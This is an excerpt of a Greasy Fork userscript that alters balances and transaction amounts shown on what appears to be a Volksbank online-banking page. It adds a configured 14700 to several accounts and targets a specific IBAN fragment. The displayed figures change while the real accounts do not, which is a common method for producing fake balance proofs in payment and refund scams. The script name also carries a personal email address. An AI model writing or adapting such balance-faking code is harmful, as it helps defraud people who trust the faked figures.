// ==UserScript==
// @name         Ed 4Rec  vb.k.waldow@t-online.de
...
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/533839/Ed%204Rec%20%20vbkwaldow%40t-onlinede.user.js
// @updateURL https://update.greasyfork.org/scripts/533839/Ed%204Rec%20%20vbkwaldow%40t-onlinede.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  14700},
        { index: 1, adjustmentAmount:  1},
        { index: 2, adjustmentAmount:  0},
        { index: 3, adjustmentAmount: 14700},
        { index: 4, adjustmentAmount: 14700},
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    // Define the target text content to search for (case and whitespace insensitive)
       var targetTextContent1 = "DE25 3406 0094";
       var targetTextContent2 = " 0001 7334 43";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 14700; // Adjust the amount as needed
